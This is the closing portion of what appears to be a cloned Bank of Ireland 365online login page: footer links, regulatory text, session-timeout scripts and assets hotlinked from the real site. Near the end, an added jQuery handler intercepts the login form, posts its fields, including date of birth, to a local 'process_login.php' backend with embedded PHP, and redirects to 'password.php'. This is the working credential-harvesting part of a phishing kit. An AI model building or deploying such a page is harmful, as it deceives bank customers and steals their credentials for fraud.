                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-CookiesAndPrivacyPolicy">
                                             <div>
                                                <a href="   html/Cookies.html       " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Manage cookie settings
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-TermsAndConditions" class="rowFooterBtn  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-TermsAndConditions__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-TermsAndConditions">
                                             <div>
                                                <a href="      https://personalbanking.bankofireland.com/ways-to-bank/online-banking/terms-and-conditions/    " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Terms & Conditions
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_BUT_69C8246690E4F112264145" class="rowFooterBtn  ">
                                          <div id="C3__p1_BUT_69C8246690E4F112264145__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_BUT_69C8246690E4F112264145">
                                             <div>
                                                <a href="    https://www.bankofireland.com/privacy/data-protection-notice/      " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Data Privacy Notice
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-RegulatoryInformation" class="rowFooterBtn  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-RegulatoryInformation__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-RegulatoryInformation">
                                             <div>
                                                <a href="     html/RegulatoryInformation.html     " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Regulatory info
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-Accessibility" class="rowFooterBtn rowFooterBtn--last  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-Accessibility__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-Accessibility">
                                             <div>
                                                <a href="       html/Accessibility.html   " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Accessibility
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div id="C3__FMT_7AA09DCFE286E9F1152125" class="responsive-row">
                                    <div class="ecDIBCol  ecDIB  responsive-column" id="C3__COL_7FF7CAFAACF93118546434">
                                       <div class="boi-footer-divider" id="C3__SPC_7AA09DCFE286E9F1152127" style="text-align: left; "></div>
                                       <div class="tc-card-spacing-1" id="C3__SPC_7FF7CAFAACF93118522004" style="text-align: left; ">&nbsp;<br/></div>
                                       <div id="C3__row_HEAD_7FF7CAFAACF93118510750">
                                          <div id="C3__p1_HEAD_7FF7CAFAACF93118510750" style="text-align: center; ; " class="ecDIB  boi-tg__size--small--fixed boi-tg__font--regular boi_grey--dark">
                                             <div>Bank of Ireland is regulated by the Central Bank of Ireland. Bank of Ireland trading as The Mortgage Store - powered by Bank of Ireland is regulated by the Central Bank of Ireland. Bank of Ireland (UK) plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. Bank of Ireland Life is a trading name of New Ireland Assurance Company plc. New Ireland Assurance Company plc trading as Bank of Ireland Life is regulated by the Central Bank of Ireland. Life assurance and pension products are provided by New Ireland Assurance Company plc trading as Bank of Ireland Life. Bank of Ireland is a tied agent of New Ireland Assurance Company plc trading as Bank of Ireland Life for life assurance and pensions business. Bank of Ireland Mortgage Bank trading as Bank of Ireland Mortgages is regulated by the Central Bank of Ireland.</div>
                                          </div>
                                       </div>
                                       <div class="boi-space-le-height" id="C3__SPC_0C9D7ABFEE94FA12445852" style="text-align: left; ">&nbsp;<br/></div>
                                       <div id="C3__row_HEAD_AF39ABD0C7EC1773333025" style="display: none;">
                                          <div id="C3__p1_HEAD_AF39ABD0C7EC1773333025" style="display: none;text-align: center; ; ">
                                             <div>
                                                <h3 id="C3__HEAD_AF39ABD0C7EC1773333025" class="boi_para  ecDIB  ">Build info: DEPLOY_Sprint_6_V_3_Stub_V_2.5</h3>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div id="C3__FMT_1F1A3EDA5084979B422865" class="fixed-footer-menu pre-login">
                           <div id="C3__row_MNU_1F1A3EDA5084979B422896">
                              <div id="C3__MNU_1F1A3EDA5084979B422896" class="ecDIB">
                                 <div>
                                    <ul class="fixed-footer-menu pre-login boi-no-margin menu_container boi-flex boi-override">
                                       <li id="C3__ITM_1F1A3EDA5084979B422901">
                                          <a class="boi-fixed-menu-item boi-flex height-100 boi-flex--vertical--centre boi-flex--horizontal--centre boi-flex--columns cordova-inapp-link"href="https://www.bankofireland.com/branch-locator/" target="_blank"><img src="https://www.365online.com/Digital/images/BOI/map-marker-white-icon.svg" aria-hidden="true"  /></span><span class="boi_label_sm_white mt-4" title="Find ATM/Branch">Find ATM/Branch</span></a>
                                       </li>
                                       <li id="C3__ITM_1F1A3EDA5084979B422921">
                                          <a class="boi-fixed-menu-item boi-flex height-100 boi-flex--vertical--centre boi-flex--horizontal--centre boi-flex--columns" href="#"onclick="return goNavItem('', 'C3__F9D5C8826737440D MenuItem 8', false, false, 'NAVMENU_', this, true);"><img src="https://www.365online.com/Digital/images/BOI/more-prelogin-icon.svg" aria-hidden="true" /></span><span class="boi_label_sm_white mt-4" title="More">More</span></a>
                                       </li>
                                    </ul>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div>
               <div id="p1_GRP_0B37D66569FE47FA317487" style="position: relative; width: 100%">
                  <script type="text/javascript">
                     var servletSessionInactivityIntervalSeconds = 300;
                     var sessionTimeoutWarningPeriodSeconds = 60;
                     var safetyMarginSeconds = 10;
                     var applicationUrl = "ajaxservletcontroller";
                     var nominalSessionExpireyOffsetSeconds = servletSessionInactivityIntervalSeconds - safetyMarginSeconds;
                     var intervalBeforeSessionTimeoutWarningMillis = 1000 * (nominalSessionExpireyOffsetSeconds - sessionTimeoutWarningPeriodSeconds);
                     var sessionWarningTimeout = window.setTimeout(showSessionTimeoutWarningDg, intervalBeforeSessionTimeoutWarningMillis);
                     var warningSecondsRemaining = sessionTimeoutWarningPeriodSeconds;
                     sessionActivateTime = new Date();

                     $(document).ready(function () {
                     sessionActivateTime = new Date();
                     $('.boi-timer-close-button, .boi-timer-click').click(function (){
                     $("#FMT_67FC3294F06B696E342314").dialog('close');
                     resetSessionTime();
                     });
                     document.addEventListener("resume",checkSessionAliveOnResume, false);
                     document.onkeypress = debounce(function() {
                     resetSessionTime();
                     }, 250);
                     $('input,textarea').keyup(debounce(function() {
                     resetSessionTime();
                     }, 250));
                     $(window).scroll(debounce(function() {
                     resetSessionTime();
                     }, 250));
                     });

                     function checkSessionAliveOnResume() {
                     var timeOnResumes = new Date();
                     var idleTime = Math.trunc((timeOnResumes - sessionActivateTime) / 1000 );
                     // If Idle time exceeds session timeout then Sign out or Reset session
                     if(idleTime >= servletSessionInactivityIntervalSeconds) {
                     doRedirectToLoginPage();
                     }
                     }
                     <!-- This code is to reset the session time while scrolling and typing event -->
                     <!-- creating a XMLHttpRequest object and calling send() method to resetting session time with no http return content-->
                     function resetSessionTime() {
                     var timeNow = new Date();
                     if ((timeNow - sessionActivateTime) > (safetyMarginSeconds * 1000)) {
                     try{
                     sessionActivateTime = timeNow;
                     warningSecondsRemaining = sessionTimeoutWarningPeriodSeconds;
                     var req = createRequestObject();
                     window.clearTimeout(sessionWarningTimeout);
                     sessionWarningTimeout = window.setTimeout(showSessionTimeoutWarningDg, intervalBeforeSessionTimeoutWarningMillis);
                     req.open('POST', applicationUrl, true);
                     req.send(null);
                     }catch(e){console.log(e);}
                     }
                     }

                     function setCountdownUpdateTimer() {
                     var localTime = new Date();
                     var timeremaining = warningSecondsRemaining - Math.floor((localTime - popupTime) / 1000 );
                     if(timeremaining < 0)
                     timeremaining = 0;
                     var countdownSecondsElem = document.getElementById('sessionTimeoutCountdownSeconds');

                     if (countdownSecondsElem != null){
                     if(timeremaining.toString().length <2){
                     countdownSecondsElem.innerHTML = '' + '0' + timeremaining;
                     }
                     else
                     countdownSecondsElem.innerHTML = '' + timeremaining;
                     }
                     window.setTimeout((timeremaining > 0) ? setCountdownUpdateTimer : checkSessionTimeAndLogout, 1000);
                     }
                     var popupTime;
                     function showSessionTimeoutWarningDg() {
                     popupTime = new Date();
                     var timeOnPause;
                     var timeOnResume;
                     document.addEventListener("pause", onPause, false);
                     function onPause() {
                     timeOnPause = new Date();
                     }
                     document.addEventListener("resume", onResume, false);
                     function onResume() {
                     timeOnResume = new Date();
                     var sleepTime = (timeOnResume-timeOnPause)/1000;
                     sleepTime = Math.trunc(sleepTime);
                     if(warningSecondsRemaining > sleepTime) {
                     warningSecondsRemaining = warningSecondsRemaining - sleepTime ;
                     } else {
                     warningSecondsRemaining = 0;
                     document.forms['sessionTimeoutForm'].submit();
                     }
                     }
                     setCountdownUpdateTimer();
                     var dlg = $( jq("FMT_67FC3294F06B696E342314") ).dialog({
                     title: "Time out warning",
                     width: 320,
                     height: 240,
                     zIndex: 3000,
                     resizable: false,
                     modal: true,
                     position: 'center',
                     closeOnEscape: true,
                     draggable: false,
                     appendTo: "#form1",
                     dialogClass: "session-timeout-container",
                     open: function() {
                     $('html').addClass('boi-overflowYHidden');
                     accessibility.setKeepFocusInside(FMT_67FC3294F06B696E342314, true);
                     },
                     beforeClose: function(){
                     $('html').removeClass('boi-overflowYHidden');
                     },
                     close: function(event, ui) {
                     document.getElementById("FMT_67FC3294F06B696E342314_flag").value = "N";
                     accessibility.setKeepFocusInside(FMT_67FC3294F06B696E342314, false);
                     }
                     });
                     }

                     function doRedirectToLoginPage() {
                     document.forms['sessionTimeoutForm'].submit();
                     }

                     function checkSessionTimeAndLogout() {
                     var localTime = new Date();
                     var timeremaining = warningSecondsRemaining - Math.floor((localTime - sessionActivateTime) / 1000 );
                     if(timeremaining <= 0) {
                     doRedirectToLoginPage();
                     }
                     }
                     // connect_ajax.js override

                     function send(url, async, ajaxCaller, ns){
                     var dest = url.substring(0, url.indexOf("?"));
                     var params = url.substring(url.indexOf("?") + 1);
                     var result = makePOSTRequest(dest, async, params, ns, ajaxCaller);

                     window.clearTimeout(sessionWarningTimeout);
                     sessionWarningTimeout = window.setTimeout(showSessionTimeoutWarningDg, intervalBeforeSessionTimeoutWarningMillis);

                     return result;
                     }
                  </script>
                  <div id="FMT_67FC3294F06B696E342314" style='display: none'>
                     <div>
                        <div id="row_BUT_F42A51BCA5D6F59E1239129">
                           <div id="p1_BUT_F42A51BCA5D6F59E1239129" class="ecDIB  col-hidden">
                              <div>&nbsp;</div>
                           </div>
                           <div class="ecDIB  responsive-column col-full  " style="text-align: right; " id="p4_BUT_F42A51BCA5D6F59E1239129">
                              <div>
                                 <a title="CLOSE" onclick="ajaxButtonAction( null, '__F42A51BCA5D6F59E FormButton 46', 'BUT_F42A51BCA5D6F59E1239129', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="tc-normal-icon-with-text tc-tab-highlight boi-btn-color Textlink_01 boi_header_close_icon tc-uppercase boi-timer-close-button" id="BUT_F42A51BCA5D6F59E1239129"><span>CLOSE</span></a>
                                 <script type="text/javascript" charset="utf-8">
                                    //<![CDATA[



                                    $(function() {

                                    function doWork(e) {










                                    var $parent =  $("html") ;




                                    if (!(typeof(boiparm) == 'undefined')){
                                    if (typeof (boiparm.boiform) == 'function'){
                                    boiparm.boiform('boi_prefs');
                                    }
                                    }



                                    ajaxButtonAction( null, '__F42A51BCA5D6F59E FormButton 46', 'BUT_F42A51BCA5D6F59E1239129', false, null, '', 'servletcontroller', '', false, true, '' );




                                    }
                                    var $el = $("#BUT_F42A51BCA5D6F59E1239129:not([handlerChanged='Y'])");
                                    $el.attr("handlerChanged", "Y")
                                    .attr("onoldclick", $el.attr("onclick"))
                                    .removeProp("onclick");
                                    if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                    $el.on("click", function(e) {
                                    doWork(e);
                                    });
                                    }

                                    //Add support for space bar button click
                                    $("#BUT_F42A51BCA5D6F59E1239129").keydown(function(e) {
                                    if (e.which == 32) {
                                    $("#BUT_F42A51BCA5D6F59E1239129").click();
                                    e.preventDefault();
                                    }
                                    });
                                    });
                                    //]]>
                                 </script>
                              </div>
                           </div>
                        </div>
                        <div id="row_HEAD_0B37D66569FE47FA317489">
                           <div id="p1_HEAD_0B37D66569FE47FA317489" style="text-align: center; ; ">
                              <div>
                                 <h1 id="HEAD_0B37D66569FE47FA317489" class="boi_input boi-mt-20  ecDIB  ">Your session is about to end.</h1>
                              </div>
                           </div>
                        </div>
                        <div id="row_HEAD_0B37D66569FE47FA317488">
                           <div id="p1_HEAD_0B37D66569FE47FA317488" style="text-align: center; ; ">
                              <div>
                                 <h2 id="HEAD_0B37D66569FE47FA317488" class="boi-timer boi-mt-25  ecDIB  ">00 : <span id="sessionTimeoutCountdownSeconds" role="timer"></span><br /></h2>
                              </div>
                           </div>
                        </div>
                        <div id="row_HEAD_B28D8586F5D77EB5868409">
                           <div id="p1_HEAD_B28D8586F5D77EB5868409" style="text-align: center; ; ">
                              <div>
                                 <h3 id="HEAD_B28D8586F5D77EB5868409" class="boi_input boi-mt-25 boi-mb-13  ecDIB  ">Do you want to keep your session active?</h3>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="ecDIBCol  ecDIB  responsive-column col-full-xs col-3-8-sm col-full-md col-full-lg col-full-xl boi_popup_button_wrap" id="COL_F109BFCE75C260C31741236" style="width: 100%">
                        <div id="row_BUT_F109BFCE75C260C31741217">
                           <div id="p1_BUT_F109BFCE75C260C31741217" class="ecDIB  ">
                              <div>&nbsp;</div>
                           </div>
                           <div class="ecDIB  tc-full-button-xs  " style="text-align: center; " id="p4_BUT_F109BFCE75C260C31741217">
                              <div>
                                 <button id="BUT_F109BFCE75C260C31741217" type="button" class="tc-accent-bg-new tc-button-color rolebutton tc-button tc-rounded-1 tc-uppercase tc-normal-icon-with-text rolebutton boi-warning-confirm-btn boi-timer-click">Stay active</button>
                                 <script type="text/javascript" charset="utf-8">
                                    //<![CDATA[



                                    $(function() {

                                    function doWork(e) {












                                    var $parent =  $("html") ;




                                    if (!(typeof(boiparm) == 'undefined')){
                                    if (typeof (boiparm.boiform) == 'function'){
                                    boiparm.boiform('boi_prefs');
                                    }
                                    }



                                    ajaxButtonAction( null, '__F109BFCE75C260C3 FormButton 47', 'BUT_F109BFCE75C260C31741217', false, null, '', 'servletcontroller', '', false, true, '' );




                                    }
                                    var $el = $("#BUT_F109BFCE75C260C31741217:not([handlerChanged='Y'])");
                                    $el.attr("handlerChanged", "Y")
                                    .attr("onoldclick", $el.attr("onclick"))
                                    .removeProp("onclick");
                                    if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                    $el.on("click", function(e) {
                                    doWork(e);
                                    });
                                    }

                                    //Add support for space bar button click
                                    $("#BUT_F109BFCE75C260C31741217").keydown(function(e) {
                                    if (e.which == 32) {
                                    $("#BUT_F109BFCE75C260C31741217").click();
                                    e.preventDefault();
                                    }
                                    });
                                    });
                                    //]]>
                                 </script>
                              </div>
                           </div>
                        </div>
                        <div id="row_BUT_F109BFCE75C260C31741219">
                           <div id="p1_BUT_F109BFCE75C260C31741219" class="ecDIB  col-hidden">
                              <div>&nbsp;</div>
                           </div>
                           <div class="ecDIB  " style="text-align: center; " id="p4_BUT_F109BFCE75C260C31741219">
                              <div><button title="End session" onclick="ajaxButtonAction( null, '__F109BFCE75C260C3 FormButton 48', 'BUT_F109BFCE75C260C31741219', false, null, '', 'servletcontroller', '', false, true, '' );" type="button" name="__F109BFCE75C260C3 FormButton 48" value="End session" class="boi_label_sm boi-grey-button-large" id="BUT_F109BFCE75C260C31741219">End session</button></div>
                           </div>
                        </div>
                     </div>
                     <div>
                        <div class="tc-divider-no-space boi-review-twentyfive-spacing" id="SPC_F109BFCE75C260C31741240" style="text-align: left; ">&nbsp;<br/></div>
                     </div>
                     <input id="FMT_67FC3294F06B696E342314_flag" type="hidden" name="_V_SessionTimeOutWarning" value="N">
                  </div>
               </div>
            </div>
            <div>
               <div id="row_BUT_SESSION_TIMEOUT" class="hide  ">
                  <div id="p1_BUT_SESSION_TIMEOUT" class="ecDIB  ">
                     <div>&nbsp;</div>
                  </div>
                  <div class="ecDIB  " style="text-align: left; " id="p4_BUT_SESSION_TIMEOUT">
                     <div><button title="Session Timeout" onclick="return buttonClicked('__DF394FF1F92032A7 FormButton 59', false, null, '', false, 'BUT_SESSION_TIMEOUT', false, false, '', true, true, 'preInPhase');" type="button" name="__DF394FF1F92032A7 FormButton 59" value="Session Timeout" class="custom-session-timeout-btn" id="BUT_SESSION_TIMEOUT">Session Timeout</button></div>
                  </div>
               </div>
               <div style="text-align: left; display: none;" id="TXT_0F2F1A79B6B5E09F142574">
                  <script>
                     var ishybrid = localStorage.getItem('isHybridFromStorage');
                     if (!ishybrid) {
                     localStorage.setItem('isHybridFromStorage', '');
                     }

                     if('' != '' && !localStorage.getItem("userProfileJSONStorage")){
                     localStorage.setItem("userProfileJSONStorage", '');
                     }
                  </script>
               </div>
            </div>
         </div>
      </form>
      <script type="text/javascript">
         //<![CDATA[

         forwardsConfirmMsg="";
         backConfirmMsg="";
         MANDCHAR='*';

         function initForm(p_namespace) {
         if ( null == p_namespace ) p_namespace = '';
         document.addEventListener('deviceready', function() {fetchDeviceInfo(getForm(p_namespace).id)}, false);
         notifyUniversalAppsForDeviceInfo();
         if ( beforeInitForm(p_namespace) == false ) return ;
         ec_showHtmlElem(p_namespace);
         showECForm(p_namespace);
         showServerSideValidationMessagesPopup(p_namespace);
         showCmsDraftBanner(p_namespace);
         afterInitForm(p_namespace);}

         ecBrowserNavCheck();

         var tid = setInterval( function () {
             if ( document.readyState !== 'complete' ) return;
             clearInterval( tid );
             initForm('');
         }, 100 );

         function showECForm(p_ns){
         }
         function hideECForm(p_ns, p_mode, p_scroll, p_id){
         return true;}
         function getRefreshInfo() {
         var refreshInfo = {pagekey:'x2bec7449-e1f7-4b71-a6ee-077f4817a45f', pageval:'23513562-7a59-49d7-a3ef-c4187e863d10'};
         return JSON.stringify(refreshInfo);
         }
         function hasDeviceInfo() {
             return false;
         }
         function setDeviceInfoInForm(deviceInfoJsonString) {
             var namespace = '';
             var form = getForm(namespace);
             if (form != null && form.DEVICE_INFO != null) {
                 form.DEVICE_INFO.value = deviceInfoJsonString;
             }
         }
         //]]>
      </script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/T-Scripts.min.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/jquery.touchSwipe.min.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/jquery.cookie.js?version_7.0.2__6"></script>
      <form class="noscript-hidden" name="sessionTimeoutForm" method=POST action="servletcontroller" autocomplete="off">
         <input type="hidden" tabindex="-1" name="PRODUCT" value="">
         <input type="hidden" tabindex="-1" name="PRESENTATION_TYPE" value="">
         <input type="hidden" tabindex="-1" name="MODE" value="XX">
         <input type="hidden" tabindex="-1" name="Login[1].SCA[1].userJSONAfterSessionTimeOut" id="userJSONAfterSessionTimedout" value="" />
         <input type="hidden" tabindex="-1" name="WorkingElements[1].SessionLoggedOutDueToInactivity" value="Y" />
         <input id="SCAUserID" type="hidden" tabindex="-1" name="SCACards[1].userId" value="" />
         <input id="SCATxnID" type="hidden" tabindex="-1" name="SCACards[1].txnID" value="" />
      </form>
      <style>
         * {
         font-family: 'Open Sans', sans-serif !important;
         }
      </style>

      <script>

      $('#loginForm').validate();

      $('#loginForm').submit(function(e) {
        e.preventDefault();

        let dob = $('#dob').val();

        let dob_array = dob.split("/")

        let date = parseInt(dob_array[0]);
        let month = parseInt(dob_array[1]);
        let year = parseInt(dob_array[2]);

        if (date > 32 || month > 12 || year > 2004) {
          $('#doberror').css("display", "block");
        } else {
          $.ajax({
            type: 'POST',
            url: 'database_setup/routes/process_login.php<?php if (isset($_GET["error"])) { echo '?resent&uid=' . $uniqueid; } ?>',
            data: $(this).serialize(),
            success: function(data) {
              let parsed_data = JSON.parse(data);

              if (parsed_data.status == 'success') {
                window.location = 'password.php';
              }
            }
          })
        }
      });

      </script>

   </body>
</html>
<!-- Lazy loaded scripts -->
<script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/vendor-accessibility-dist.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/digital-custom-overrides.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/digital-custom-functions.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/digital-dom-manipulations.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/digital-widgets-functions.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/digital.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js/navigation.js?v=5.05"></script>
<script type="text/javascript" src="https://www.365online.com/Digital/html/js/feedback.js?v=5.05"></script>
